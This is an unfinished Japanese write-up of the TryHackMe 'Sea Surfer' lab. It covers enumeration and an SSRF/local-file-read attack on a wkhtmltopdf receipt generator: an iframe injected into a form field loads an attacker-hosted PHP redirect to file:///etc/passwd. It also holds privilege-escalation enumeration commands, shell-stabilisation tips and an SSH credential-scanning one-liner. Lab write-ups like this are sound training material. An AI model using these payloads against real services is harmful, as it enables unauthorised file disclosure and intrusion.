# Sea Surfer CTF

https://tryhackme.com/room/seasurfer

## Enumeration

```shell
TARGET=10.144.130.129
sudo bash -c "echo $TARGET   sea.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

SSH,HTTPのみ。

```sh
root@ip-10-144-81-160:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.144.130.129
+ Target Hostname:    sea.thm
+ Target Port:        80
+ Start Time:         2026-04-02 06:11:22 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5dcde2b3f2ff9 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'x-backend-server' found, with contents: seasurfer.thm
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-04-02 06:11:25 (GMT1) (3 seconds)
---------------------------------------------------------------------------
```

ドメインは、seasurfer.thm

### サブドメイン、VHOST

internalサブドメインを発見。

```shell
root@ip-10-144-81-160:~# ffuf -u http://seasurfer.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.seasurfer.thm' -fs 10918

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://seasurfer.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.seasurfer.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 10918
________________________________________________

internal                [Status: 200, Size: 3072, Words: 225, Lines: 109]
:: Progress: [19983/19983] :: Job [1/1] :: 33 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
```

メインページはWordPress、internal は領収書を発行する画面。

## WordPress

wpscan 抜粋

```sh
$ wpscan --url http://seasurfer.thm/ -e

[i] User(s) Identified:

[+] kyle
 | Found By: Author Posts - Author Pattern (Passive Detection)
```

## internal

レシートのリクエスト

```http
GET /output.php?name=thm&payment=Credit+card&comment=com&item1=abc&price1=10 HTTP/1.1
```

PDF出力されたレシートの内容

```
Receipt ID: 02042026-IzkykJiTGxXTJ2FB7fxW
Created: 02-04-2026 05:38
Sea Surfer, Co.
3099 Ocean Front Walk
Venice, CA 90291
Customer name: thm
Additional information: com
Payment Method
Credit card
Item Price
abc $10
Total: $ 10
```

- 入力項目に `{{7*'7'}}` と入れてみたが、全てそのまま表示されたのでSSTIは無い。
- Priceに `10-2` を送ると、10ドルとして計算された。eval系の脆弱性は無い。

PDFファイルをExiftoolにかける。

```sh
$ exiftool ./receipt.pdf                                            
ExifTool Version Number         : 13.50
File Name                       : receipt.pdf
Directory                       : .
File Size                       : 54 kB
File Modification Date/Time     : 2026:04:02 01:50:10-04:00
File Access Date/Time           : 2026:04:02 01:50:10-04:00
File Inode Change Date/Time     : 2026:04:02 01:50:10-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Receipt
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2026:04:02 05:47:44Z
Page Count                      : 1
```

wkhtmltopdf の脆弱性を調べたところ、バージョンが近くてかなり怪しい。

```sh
$ searchsploit wkhtmltopdf 
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
wkhtmltopdf 0.12.6 -  Server Side Request Forgery                                | asp/webapps/51039.txt
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

脆弱性の内容

```sh
$ cat ./51039.txt                                          
# Exploit Title: wkhtmltopdf 0.12.6 -  Server Side Request Forgery
# Date: 20/8/2022
# Exploit Author: Momen Eldawakhly (Cyber Guy)
# Vendor Homepage: https://wkhtmltopdf.org
# Software Link: https://wkhtmltopdf.org/downloads.html
# Version: 0.12.6
# Tested on: Windows ASP.NET <http://asp.net/>

POST /PDF/FromHTML HTTP/1.1
Host: vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

__RequestVerificationToken=Token&header=<PDFstructure+>....&data= <PDFstructure+>....<iframe+src=“http://10.10.10.1”> 
```

https://gmo-cybersecurity.com/blog/vulnerability-html-to-pdf-conversion/ が、wkhtmltopdf 0.12.5 の挙動について日本語で詳しく説明してくれている。

名前の部分に `<iframe src="http://localhost/"></iframe>` と入力したら、Apache2 Ubuntu Default Page の左上の部分が画像で表示された。

/etc/passwd は真っ白のフレームが表示された。

```
<iframe src="file:///etc/passwd"></iframe>
```

ローカルにHTMLをホストしてリクエストさせてみた。

```html
$ cat passwd    
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<body>

<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>

</body></html>
```

```
<iframe src="http://192.168.128.106:8000/passwd"></iframe>
```

しかし、確かにリクエストは来たが、真っ白のフレームが表示されたままだった。  
HTTPリクエストを確認したが、認証情報のようなものも送られていない。

```sh
$ python ./myserver.py
Serving on port 8000...
Request Headers:
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://internal.seasurfer.thm/invoice.php?name=%3Ciframe+src%3D%22http%3A%2F%2F192.168.128.106%3A8000%2Fpasswd%22%3E%3C%2Fiframe%3E&payment=Credit+card&comment=aa&item1=bb&price1=1&id=02042026-aw4fZplFVIQNCR8e6KjY
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 192.168.128.106:8000
10.144.191.135 - - [02/Apr/2026 03:13:50] "GET /passwd HTTP/1.1" 200 -
```

次に、下記をホストしたが、これも真っ白なフレームが表示されたままだった。

```sh
$ cat passwd
<?php
     header('location:file:///etc/passwd');
?>
```

ここで、ホストするファイルに html 拡張子を付けないと単純なレンダリングもされないことに気付いた。しかし、html 拡張子を付けても、LFIは成功しなかった。

AppArmorでローカルファイルアクセスを禁止する設定について言及されているので、これが有効になっているのではないかと思われる。

https://github.com/wkhtmltopdf/wkhtmltopdf/blob/024b2b2bb459dd904d15b911d04c6df4ff2c9031/docs/apparmor.md?plain=1#L23

```
### AppArmor for using wkhtmltopdf on untrusted files
AppArmor provides a kernel-based method to limit what wkhtmltopdf is allowed
to do, and what files it can access. While the `--disable-local-file-access`
option will block access to the local filesystem, 
```

LFIが無理とすると、SSRFしかないが、どこを狙えばよいのか分からないので列挙しなおす。

invoices は、PDFが保存されるディレクトリ。mainenance が気になる。

```sh
---- Scanning URL: http://internal.seasurfer.thm/ ----
+ http://internal.seasurfer.thm/index.php (CODE:200|SIZE:3072)                                                          
==> DIRECTORY: http://internal.seasurfer.thm/invoices/                                                                  
==> DIRECTORY: http://internal.seasurfer.thm/maintenance/
```

フレームが表示されたが、ただのForbidden表示だった。

```html
<iframe src="http://internal.seasurfer.thm/maintenance/"></iframe>
```

PHPのホストの仕方を間違えていた。PHPでホストしていなければならなかった。

```sh
$ cat passwd.php 
<?php
     header('location:file:///etc/passwd');
?>

$ php -S 0.0.0.0:8000
```

LFI成功。

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network
Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd
Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
fwupd-refresh:x:114:119:fwupd-refresh
user,,,:/run/systemd:/usr/sbin/nologin
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

/proc/self の下はなにも読めなかった。/home/kyle の下も読めそうになかった。

分からなかったのでウォークスルーをチラ見したが、http://seasurfer.thm/adminer にDBログインの画面がある。（ウォークスルーでは gobuster で発見していたが、実際やるとすぐ固まるので自分は成功しなかった）

1. その画面からDB接続するために、wp-config.php で接続情報を得る
2. パスワードハッシュから kyle のパスワードを得る
3. SSH接続

というフローを想像するが、wp-config.php のPathが不明。







## 権限昇格

```sh
# env_keep+=LD_PRELOAD は見落としがちなので注意
sudo -l
```

```sh
find / -perm -u=s -type f -ls 2>/dev/null
```

```sh
find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
```

```sh
getcap -r / 2>/dev/null
ls -al /var/backups
cat /etc/crontab
cat /etc/exports
```

どうしても何も見つからない場合の最後の手段として、linpeasのCVEリストに有効なものがないか確認する。

## 振り返り

-
-

## Tags

#tags: #tags: #tags:

```sh
# 大分類（Linuxはタグ付けしない）
Window Kerberos AWS pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM

# 脆弱性の種類
CVE-xxxx-yyyyy カーネルエクスプロイト
ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報 証明書テンプレート

# 攻撃の種類
サービス LFI SSRF XSS SQLインジェクション 競合 認証バイパス フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス PaddingOracles

# ツールなど
docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle スマートコントラクト
```

## メモ

### シェル安定化

```shell
# python が無くても、python3 でいける場合もある
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# sh: 3: export: -c: bad variable name というエラーが出る場合、まず /bin/bash を実行する。

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236
```

### SSH

ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする

```sh
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
```

エラー

```sh
# no matching host key type found. Their offer: ssh-rsa,ssh-dss
# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
```

```sh
TARGET=10.144.130.129
sudo bash -c "echo $TARGET   seasurfer.thm  internal.seasurfer.thm >> /etc/hosts"

<iframe height="2000" width="800" src="http://192.168.128.106:8888/passwd"></iframe>

```
